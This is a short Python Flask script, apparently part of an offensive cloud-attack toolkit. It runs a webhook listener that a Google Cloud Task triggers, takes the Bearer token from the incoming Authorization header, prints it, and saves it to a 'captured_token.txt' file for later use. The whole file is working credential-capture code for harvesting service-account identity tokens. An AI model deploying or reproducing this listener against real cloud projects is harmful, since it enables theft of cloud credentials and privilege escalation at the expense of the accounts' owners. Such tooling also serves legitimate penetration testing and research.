from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_jwt():
    data = request.get_data(as_text=True)
    auth_header = request.headers.get("Authorization")

    print("[+] Cloud Task triggered the listener.")
    print(f"[+] Raw POST body:\n{data}")
    print(f"[+] Authorization header:\n{auth_header}")

    if auth_header and "Bearer " in auth_header:
        token = auth_header.split("Bearer ")[1]
        with open("modules/common/captured_token.txt", "w") as f:
            f.write(token)
            f.flush()
            os.fsync(f.fileno())
        print("[+] Token saved to modules/common/captured_token.txt")
    else:
        print("[!] No Bearer token found in Authorization header.")

    return '', 204  # No content

if __name__ == "__main__":
    print("[*] Starting webhook listener on port 8080...")
    app.run(host="0.0.0.0", port=8080)
